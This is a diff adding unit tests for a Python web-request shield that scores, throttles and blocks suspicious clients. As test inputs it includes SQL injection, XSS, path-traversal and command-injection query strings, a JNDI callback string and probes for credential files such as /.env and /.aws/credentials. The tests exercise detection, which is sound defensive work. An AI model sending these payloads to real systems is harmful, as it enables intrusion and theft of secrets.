@@ -5,6 +5,7 @@ import io
 import logging
 import os
 import random
+import re
 import tempfile
 import threading
 import time
@@ -192,6 +193,39 @@ class Behaviour(unittest.TestCase):
                   "host=x%7Csh%20-c%20ls", "host=x;uname -a", "host=x%253Bcurl%2520198.51.100.1"]:
             s, _ = shield()
             self.assertIn("payload:cmdi", s.check("203.0.113.17", "GET", "/ping", q, BROWSER).hits, q)
+
+    def test_propfind_is_a_soft_signal(self):
+        # Windows and Office send PROPFIND by themselves when someone opens a link
+        # from a document, so it cannot be worth 30 points every time.
+        s, c = shield()
+        webdav = {"User-Agent": "Microsoft-WebDAV-MiniRedir/10.0.19045", "Accept-Language": "en"}
+        hits = []
+        for method in ["OPTIONS", "PROPFIND", "PROPFIND", "PROPFIND", "PROPFIND", "GET"] * 3:
+            c.t += 0.3
+            d = s.check("192.0.2.62", method, "/docs/report.docx", headers=webdav)
+            self.assertEqual(d.action, "pass", method)
+            hits += d.hits
+        self.assertEqual(hits, ["method:PROPFIND"])                 # counted once per half-life
+        self.assertLess(s._tracks["192.0.2.62"].score, s.cfg.throttle_score)
+        # With every other soft signal piled on, for an hour, it still stops nothing.
+        s, c = shield(tls_header="X-JA4", tls_denylist=["t13d_example"])
+        loud = {"User-Agent": CHROME.replace("Chrome/", "HeadlessChrome/") + " python-requests/2.32",
+                "X-JA4": "t13d_example"}
+        for _ in range(3600):
+            c.t += 1.0
+            d = s.check("192.0.2.63", "PROPFIND", "/docs/report.docx", headers=loud)
+            self.assertEqual(d.action, "pass", d.hits)
+        self.assertEqual(s._tracks["192.0.2.63"].hard, 0)
+        self.assertLessEqual(s._tracks["192.0.2.63"].soft_points, s.cfg.soft_cap)
+
+    def test_other_odd_methods_are_scored_every_time(self):
+        for method in ["TRACE", "TRACK", "CONNECT", "DEBUG"]:
+            s, _ = shield()
+            self.assertEqual(s.check("203.0.113.19", method, "/", headers=BROWSER).action, "pass", method)
+            self.assertEqual(s.check("203.0.113.19", method, "/", headers=BROWSER).action, "throttle", method)
+        s, c = shield()                           # and PROPFIND still adds to hard evidence
+        s.check("203.0.113.20", "TRACE", "/", headers=BROWSER)
+        self.assertEqual(s.check("203.0.113.20", "PROPFIND", "/", headers=BROWSER).action, "throttle")
 
     def test_metronomic_cadence_is_flagged_but_soft(self):
         s, c = shield()
@@ -448,6 +482,369 @@ class Adapters(unittest.TestCase):
         self.assertEqual(asyncio.run(call("Mozilla/5.0 (spa-api-recon spider)")), 403)
 
 
+def wsgi_site(s, real=("/", "/products", "/thread/7")):
+    """A small site behind the WSGI adapter. Returns visit(path, query, headers, ip, method) -> status code."""
+    def app(environ, start_response):
+        ok = environ["PATH_INFO"] in real
+        start_response("200 OK" if ok else "404 Not Found", [("Content-Type", "text/plain")])
+        return [b"hi"]
+
+    wrapped = ShieldWSGI(app, s)
+
+    def visit(path, query="", headers=None, ip="192.0.2.200", method="GET"):
+        env = {"REQUEST_METHOD": method, "PATH_INFO": path, "QUERY_STRING": query, "REMOTE_ADDR": ip,
+               "HTTP_HOST": "shop.example", "wsgi.input": io.BytesIO()}
+        for k, v in (BROWSER if headers is None else headers).items():
+            env["HTTP_" + k.upper().replace("-", "_")] = v
+        out = {}
+        b"".join(wrapped(env, lambda st, h, e=None: out.update(status=st)))
+        return int(out["status"].split()[0])
+
+    return visit
+
+
+# What a browser adds when a page, not the person, made it send the request.
+CROSS_SITE_IMAGE = dict(BROWSER, **{"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors",
+                                    "Sec-Fetch-Dest": "image", "Referer": "https://forum.example/"})
+CROSS_SITE_LINK = dict(BROWSER, **{"Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate",
+                                   "Sec-Fetch-Dest": "document", "Sec-Fetch-User": "?1"})
+SIBLING_SITE_FETCH = dict(BROWSER, **{"Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors",
+                                      "Sec-Fetch-Dest": "empty", "Origin": "https://users.shop.example"})
+OWN_PAGE_IMAGE = dict(BROWSER, **{"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "no-cors",
+                                  "Sec-Fetch-Dest": "image", "Referer": "https://shop.example/thread/7"})
+OLD_BROWSER_FOREIGN_REFERER = dict(BROWSER, Referer="https://forum.example/post/9")    # no fetch metadata at all
+INDUCED = {"cross-site image": CROSS_SITE_IMAGE, "cross-site link": CROSS_SITE_LINK,
+           "sibling-site fetch": SIBLING_SITE_FETCH, "image on the site's own page": OWN_PAGE_IMAGE,
+           "foreign Referer, old browser": OLD_BROWSER_FOREIGN_REFERER}
+# The person's own doing, as far as the browser says: typed or bookmarked, a
+# click inside the site, the site's own script. And a client that says nothing.
+DIRECT = {"typed": dict(BROWSER, **{"Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document"}),
+          "click inside the site": dict(BROWSER, **{"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
+                                                    "Sec-Fetch-Dest": "document", "Sec-Fetch-User": "?1",
+                                                    "Referer": "https://shop.example/"}),
+          "the site's own script": dict(BROWSER, **{"Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors",
+                                                    "Sec-Fetch-Dest": "empty", "Referer": "https://shop.example/"}),
+          "own-site Referer, old browser": dict(BROWSER, Referer="https://shop.example/products"),
+          "no context headers": BROWSER}
+
+
+class MissingPages(unittest.TestCase):
+    """Issue 5: a 404 is not always a guess."""
+
+    def test_polling_one_missing_resource_is_not_enumeration(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        for _ in range(300):                      # a job result that is not ready yet, asked for every 2 s
+            c.t += 2
+            self.assertEqual(visit("/api/jobs/42/result"), 404)
+        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)       # even pacing is a soft signal; nothing hard
+
+    def test_reloading_the_same_dead_links_counts_them_once(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        for reload in range(4):                   # one page with 20 dead links, loaded four times
+            c.t += 90
+            for i in range(20):
+                c.t += 0.05
+                self.assertEqual(visit(f"/gallery/item-{i}"), 404, f"reload {reload}")
+        self.assertLessEqual(s._tracks["192.0.2.200"].score, 40)     # one enumeration hit, decaying
+
+    def test_missing_page_assets_are_not_enumeration(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        for load in range(3):                     # a stale page asking for chunks a deploy removed
+            c.t += 300
+            for i in range(30):
+                c.t += 0.02
+                name = f"/static/chunk-{load}-{i}." + ("js", "js.map", "css")[i % 3]
+                self.assertEqual(visit(name), 404, name)
+        self.assertEqual(s._tracks["192.0.2.200"].score, 0)
+        s2, c2 = shield(enum_ignore_extensions=())               # an operator can count them after all
+        visit2 = wsgi_site(s2)
+        for i in range(15):
+            c2.t += 0.02
+            visit2(f"/static/chunk-{i}.js")
+        self.assertEqual(s2._tracks["192.0.2.200"].score, 40)
+
+    def test_404s_under_an_ignored_prefix_are_not_enumeration(self):
+        s, c = shield(enum_ignore_prefixes=["/api/stock"])
+        visit = wsgi_site(s)
+        for i in range(60):                       # "is this item in stock?" answered 404 for no
+            c.t += 0.5
+            self.assertEqual(visit(f"/api/stock/{i}"), 404)
+        self.assertEqual(s._tracks["192.0.2.200"].hard, 0)
+        for i in range(15):                       # the same shape next to the prefix is still counted
+            c.t += 0.5
+            visit(f"/api/stock-admin/{i}")
+        self.assertEqual(s._tracks["192.0.2.200"].hard, 40)
+        with self.assertRaises(ValueError):
+            Config(enum_ignore_prefixes=["api"])
+
+
+class SensitiveNames(unittest.TestCase):
+    """Issue 6: a file name is evidence only if the site has no such file."""
+    REAL = ("/downloads/employee-handbook.zip", "/files/feedback-2026.zip", "/dl/sandbox-tools.tar",
+            "/exports/customer-database.zip", "/docs/notes.old", "/backups/site-backup.tar")
+
+    def test_downloads_the_site_really_serves_are_not_probes(self):
+        s, c = shield()
+        visit = wsgi_site(s, real=self.REAL)
+        for _ in range(3):
+            for path in self.REAL:
+                c.t += 1
+                self.assertEqual(visit(path), 200, path)
+        self.assertEqual(s._tracks["192.0.2.200"].score, 0)
+
+    def test_asking_for_a_dump_the_site_does_not_have_is_a_probe(self):
+        events = []
+        s, c = shield(on_event=events.append)
+        visit = wsgi_site(s)
+        self.assertEqual(visit("/db-backup.sql"), 404)            # the app answers first...
+        self.assertEqual(events[-1]["hits"], ["decoy:sensitive-file-probe"])
+        self.assertEqual(visit("/"), 429)                         # ...then it counts: 60 points
+        self.assertEqual(visit("/index.php.bak", ip="192.0.2.201"), 404)
+        self.assertEqual(visit("/", ip="192.0.2.201"), 429)
+
+    def test_a_dead_link_to_an_ordinary_archive_is_not_a_probe(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        for path in ["/downloads/employee-handbook.zip", "/files/feedback-2026.zip", "/dl/sandbox-tools.tar"]:
+            c.t += 1                               # "db" inside handbook, feedback, sandbox
+            self.assertEqual(visit(path), 404)
+        self.assertEqual(s._tracks["192.0.2.200"].score, 0)
+        for path in ["/mydb.sql", "/db_2026.zip", "/userdb-export.tar"]:
+            s2, _ = shield()
+            wsgi_site(s2)(path)
+            self.assertEqual(s2._tracks["192.0.2.200"].score, 60, path)
+
+    def test_dotfiles_and_keys_are_still_scored_on_sight(self):
+        for path in ["/.env", "/.git/config", "/.aws/credentials", "/id_rsa", "/wp-config.php.bak", "/server-status"]:
+            s, _ = shield()
+            d = s.check("203.0.113.70", "GET", path, headers=BROWSER)
+            self.assertEqual((d.action, d.hits), ("throttle", ["decoy:sensitive-file-probe"]), path)
+        s, _ = shield(mode="monitor")             # served in monitor mode, then a 404: still one probe, not two
+        s.check("203.0.113.71", "GET", "/wp-config.php.bak", headers=BROWSER)
+        s.observe("203.0.113.71", "/wp-config.php.bak", 404)
+        self.assertEqual(s._tracks["203.0.113.71"].score, 60)
+
+
+class InducedRequests(unittest.TestCase):
+    """Issue 7: a request some page made the visitor's browser send is never
+    held against the visitor. Otherwise anyone who can show them an image tag
+    can have them blocked."""
+
+    def setUp(self):
+        self.canaries = make_canaries("site-secret")
+
+    def test_canary_loaded_by_another_page_does_not_block_the_visitor(self):
+        for name, headers in INDUCED.items():
+            s, c = shield(canary_paths=self.canaries)
+            visit = wsgi_site(s)
+            self.assertEqual(visit(self.canaries[0], headers=headers), 403, name)     # that one request is refused
+            self.assertEqual(s.blocklist(), {}, name)
+            for _ in range(5):                                                         # and the visitor carries on
+                c.t += 1
+                self.assertEqual(visit("/products", "page=2&id=5"), 200, name)
+
+    def test_refusal_is_reported_and_scores_nothing(self):
+        events = []
+        s, _ = shield(canary_paths=self.canaries, on_event=events.append)
+        d = s.check("192.0.2.210", "GET", self.canaries[0], headers=dict(CROSS_SITE_IMAGE, Host="shop.example"))
+        self.assertEqual((d.action, d.stop, d.score, d.hits), ("refuse", True, 0.0, ["decoy:canary-path"]))
+        self.assertTrue(d.induced)
+        self.assertEqual(events[-1]["action"], "refuse")
+        self.assertEqual(s.stats["refused"], 1)
+        self.assertEqual((s.stats["blocked"], s.stats["throttled"]), (0, 0))
+        self.assertNotIn("192.0.2.210", s._tracks)
+
+    def test_nothing_another_page_forces_is_held_against_the_visitor(self):
+        for name, headers in INDUCED.items():
+            s, c = shield(canary_paths=self.canaries)
+            visit = wsgi_site(s)
+            forced = [(self.canaries[1], ""), ("/.env", ""), ("/search", "q=%3Cscript%3Ealert(1)%3C/script%3E"),
+                      ("/item", "id=1%27%20UNION%20SELECT%20null--"), ("/db-backup.sql", "")]
+            forced += [(p, "") for p in ("/admin", "/wp-login.php", "/phpmyadmin/", "/console", "/actuator/env")]
+            forced += [(f"/junk-{i}", "") for i in range(60)]         # sixty dead paths
+            forced += [("/", "")] * 600                               # and a flood
+            for path, query in forced:
+                c.t += 0.01
+                self.assertIn(visit(path, query, headers), (200, 403, 404), f"{name}: {path}")
+            self.assertEqual(s.blocklist(), {}, name)
+            self.assertNotIn("192.0.2.200", s._tracks, name)
+            for _ in range(5):
+                c.t += 1
+                self.assertEqual(visit("/products"), 200, name)
+
+    def test_referer_carrying_a_callback_marker_does_not_block_the_visitor(self):
+        s, c = shield()
+        visit = wsgi_site(s)
+        evil = dict(CROSS_SITE_IMAGE, Referer="https://forum.example/?x=${jndi:ldap://c9abc.oast.fun/a}")
+        self.assertEqual(visit("/", headers=evil), 403)
+        self.assertEqual(visit("/"), 200)
+        self.assertEqual(s.blocklist(), {})
+
+    def test_a_forged_marker_gets_no_attack_request_through(self):
+        s, c = shield(canary_paths=self.canaries)
+        visit = wsgi_site(s)
+        attacks = [("/item", "id=1%27%20UNION%20SELECT%20null--"), ("/search", "q=%3Csvg%20onload=alert(1)%3E"),
+                   ("/view", "file=..%2f..%2f..%2fetc%2fpasswd"), ("/ping", "host=x%3Bcat%20%2Fetc%2Fshadow"),
+                   ("/.env", ""), ("/.git/config", ""), (self.canaries[0], "")]
+        for name, headers in INDUCED.items():
+            for path, query in attacks * 3:
+                c.t += 0.2
+                self.assertEqual(visit(path, query, headers), 403, f"{name}: {path}?{query}")
+            self.assertEqual(visit("/", headers=dict(headers, **{"User-Agent": "sqlmap/1.9"})), 403, name)
+
+    def test_the_visitors_own_requests_are_scored_as_before(self):
+        for name, headers in DIRECT.items():
+            s, c = shield(canary_paths=self.canaries)
+            visit = wsgi_site(s)
+            self.assertEqual(visit("/item", "id=1%27%20UNION%20SELECT%20null--", headers), 429, name)
+            self.assertEqual(visit(self.canaries[0], headers=headers), 403, name)
+            self.assertIn("192.0.2.200", s.blocklist(), name)
+            self.assertEqual(visit("/"), 403, name)
+        s, c = shield()
+        visit = wsgi_site(s)
+        for i in range(15):                       # and their 404s still count
+            c.t += 1
+            visit(f"/guess-{i}", headers=DIRECT["typed"])
+        self.assertEqual(s._tracks["192.0.2.200"].score, 40)
+
+    def test_scoring_induced_requests_can_be_switched_back_on(self):
+        s, _ = shield(canary_paths=self.canaries, score_induced=True)
+        visit = wsgi_site(s)
+        self.assertEqual(visit(self.canaries[0], headers=CROSS_SITE_IMAGE), 403)
+        self.assertIn("192.0.2.200", s.blocklist())
+
+    def test_a_blocked_address_stays_blocked_whatever_it_claims(self):
+        s, _ = shield()
+        visit = wsgi_site(s)
+        self.assertEqual(visit("/", headers={"User-Agent": "sqlmap/1.9"}), 403)
+        for name, headers in INDUCED.items():
+            self.assertEqual(visit("/", headers=headers), 403, name)
+
+    def test_asgi_passes_the_context_through(self):
+        async def app(scope, receive, send):
+            await send({"type": "http.response.start", "status": 404, "headers": []})
+            await send({"type": "http.response.body", "body": b""})
+
+        s, _ = shield(canary_paths=self.canaries)
+        wrapped = ShieldASGI(app, s)
+
+        async def call(path, extra=()):
+            sent = []
+            scope = {"type": "http", "method": "GET", "path": path, "query_string": b"",
+                     "client": ("192.0.2.220", 5555),
+                     "headers": [(b"host", b"shop.example"), (b"user-agent", CHROME.encode()),
+                                 (b"accept-language", b"en")] + list(extra)}
+
+            async def send(m):
+                sent.append(m)
+
+            await wrapped(scope, None, send)
+            return sent[0]["status"]
+
+        embedded = [(b"sec-fetch-site", b"cross-site"), (b"sec-fetch-dest", b"image")]
+        self.assertEqual(asyncio.run(call(self.canaries[0], embedded)), 403)
+        for i in range(40):
+            self.assertEqual(asyncio.run(call(f"/junk-{i}", embedded)), 404)
+        self.assertEqual(s.blocklist(), {})
+        self.assertNotIn("192.0.2.220", s._tracks)
+
+
+class MonitorMode(unittest.TestCase):
+    """Issue 13: monitor mode has to report what enforce mode would do."""
+
+    def test_a_client_never_told_to_wait_is_not_ignoring_the_wait(self):
+        events = []
+        s, c = shield(mode="monitor", on_event=events.append)
+        self.assertEqual(s.check("192.0.2.230", "GET", "/.env", headers=BROWSER).action, "throttle")
+        for _ in range(40):                       # it got a normal answer, so it keeps browsing
+            c.t += 1
+            d = s.check("192.0.2.230", "GET", "/", headers=BROWSER)
+            self.assertEqual((d.action, d.stop), ("throttle", False))
+        self.assertEqual(s.blocklist(), {})
+        self.assertNotIn("behavior:ignored-retry-after", [h for e in events for h in e["hits"]])
+        c.t += 600                                # and the score decays as it would have
+        self.assertEqual(s.check("192.0.2.230", "GET", "/", headers=BROWSER).action, "pass")
+
+    def test_enforce_mode_still_escalates_a_client_that_ignores_the_wait(self):
+        s, c = shield()
+        s.check("192.0.2.231", "GET", "/.env", headers=BROWSER)
+        for _ in range(12):
+            c.t += 1
+            d = s.check("192.0.2.231", "GET", "/", headers=BROWSER)
+        self.assertEqual(d.action, "block")
+
+    def test_a_would_be_blocked_address_is_still_reported(self):
+        events = []
+        s, c = shield(mode="monitor", on_event=events.append)
+        s.check("203.0.113.80", "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
+        self.assertEqual([e["action"] for e in events], ["block"])
+        c.t += 5                                  # it was not stopped, so it carries on
+        d = s.check("203.0.113.80", "GET", "/item", "id=1%27%20UNION%20SELECT%20null--", BROWSER)
+        self.assertEqual((d.action, d.stop, d.hits), ("block", False, ["blocklist", "payload:sqli"]))
+        self.assertEqual((events[-1]["action"], events[-1]["enforced"]), ("blocked", False))
+        self.assertEqual(events[-1]["hits"], ["blocklist", "payload:sqli"])
+        # Quiet requests are reported too, once per half-life: a person browsing
+        # on while "blocked" is how a false positive shows up.
+        before = len(events)
+        for _ in range(50):
+            c.t += 1
+            self.assertEqual(s.check("203.0.113.80", "GET", "/", headers=BROWSER).hits, ["blocklist"])
+        self.assertEqual(len(events), before + 1)
+        self.assertEqual(events[-1]["hits"], ["blocklist"])
+        for _ in range(50):                       # a soft signal alone does not make every request an event
+            c.t += 1
+            s.check("203.0.113.80", "GET", "/", headers={"User-Agent": "python-requests/2.32"})
+        self.assertEqual(len(events), before + 1)
+        # None of it changes what enforce mode would have done: one block, one hour.
+        self.assertEqual((s.stats["blocked"], s._tracks["203.0.113.80"].strikes), (1, 1))
+        self.assertEqual(s._tracks["203.0.113.80"].score, 0)
+        c.t += 3600
+        self.assertEqual(s.check("203.0.113.80", "GET", "/", headers=BROWSER).action, "pass")
+
+    def test_enforce_mode_does_not_report_requests_it_refuses_by_block(self):
+        events = []
+        s, c = shield(on_event=events.append)
+        s.check("203.0.113.81", "GET", "/", headers={"User-Agent": "sqlmap/1.9"})
+        d = s.check("203.0.113.81", "GET", "/item", "id=1%27%20UNION%20SELECT%20null--", BROWSER)
+        self.assertEqual((d.action, d.hits), ("block", ["blocklist"]))
+        self.assertEqual(len(events), 1)
+
+
+class ExemptPaths(unittest.TestCase):
+    """Issue 14: an exemption covers a path and what is under it, nothing else."""
+    BAD = {"User-Agent": "sqlmap/1.9"}
+
+    def test_exemption_stops_at_the_segment_boundary(self):
+        s, _ = shield(exempt_paths=["/static", "/healthz", "/assets/"])
+        for path in ["/static", "/static/", "/static/app.js", "/static/css/site.css", "/healthz", "/assets/logo.png",
+                     "/assets"]:
+            self.assertEqual(s.check("203.0.113.90", "GET", path, headers=self.BAD).action, "pass", path)
+        for path in ["/static-admin/users", "/staticfiles", "/healthz-internal", "/healthzz", "/assetsx",
+                     "/api/static/x", "/static/../api/items", "/static/..%2fapi/items", "/static/%2e%2e/api/items",
+                     "/static/..\\api", "/%73tatic/app.js", "/static/.."]:
+            s2, _ = shield(exempt_paths=["/static", "/healthz", "/assets/"])
+            self.assertEqual(s2.check("203.0.113.91", "GET", path, headers=self.BAD).action, "block", path)
+
+    def test_404s_next_to_an_exempt_path_are_still_counted(self):
+        s, c = shield(exempt_paths=["/static"])
+        visit = wsgi_site(s)
+        for i in range(15):
+            c.t += 1
+            visit(f"/static-old/guess-{i}")
+        self.assertEqual(s._tracks["192.0.2.200"].score, 40)
+
+    def test_exemptions_that_would_cover_everything_are_refused(self):
+        for bad in ["", "/", "//", "static", " /static", "*"]:
+            with self.assertRaises(ValueError, msg=repr(bad)):
+                Config(exempt_paths=[bad])
+        with self.assertRaises(ValueError):
+            Config(exempt_paths="/static")        # a bare string would be read letter by letter
+        Config(exempt_paths=["/static", "/healthz/"])
+
+
 class Cost(unittest.TestCase):
     """The shield reads attacker-controlled text on every request, so no input
     may make that slow. Budgets are several times what a linear scan needs."""
@@ -468,8 +865,8 @@ class Cost(unittest.TestCase):
         patterns = [("HARD_UA " + label, rx) for rx, _, label in signatures.HARD_UA]
         patterns += [("SOFT_UA " + label, rx) for rx, _, label in signatures.SOFT_UA]
         patterns += [(label, rx) for rx, label in signatures.PAYLOADS + signatures.OOB]
-        patterns += [(name, getattr(signatures, name)) for name in
-                     ("ASSESSMENT_UA", "BROWSER_UA", "CRAWLER_UA", "SENSITIVE_PATHS", "RECON_PATHS")]
+        patterns += [(name, rx) for name, rx in vars(signatures).items() if isinstance(rx, re.Pattern)]
+        self.assertGreaterEqual(len(patterns), 26)
         # Repeated fragments each pattern almost matches: the shape that makes a
         # backtracking engine retry from every position.
         atoms = ["a", "db", "a-", "a.", "/", " ", "1", "mozilla/5.0 ", "ARTEX-Assessment/1 ", "union ", "union all ",
@@ -493,7 +890,9 @@ class Cost(unittest.TestCase):
                  "60000-character query": lambda: s.check("192.0.2.92", "GET", "/", "a" * 60000, BROWSER),
                  "20000 query parameters": lambda: s.check("192.0.2.93", "GET", "/", "a=b&" * 20000, BROWSER),
                  "8000-character user agent": lambda: s.check(
-                     "192.0.2.94", "GET", "/", "", {"User-Agent": "Mozilla/5.0 " * 660})}
+                     "192.0.2.94", "GET", "/", "", {"User-Agent": "Mozilla/5.0 " * 660}),
+                 "8000-character referer": lambda: s.check(
+                     "192.0.2.95", "GET", "/", "", dict(BROWSER, Host="shop.example", Referer="https://" + "a." * 4000))}
         for name, fn in cases.items():
             self.assertLess(self.timed(fn), self.BUDGET, name)
 
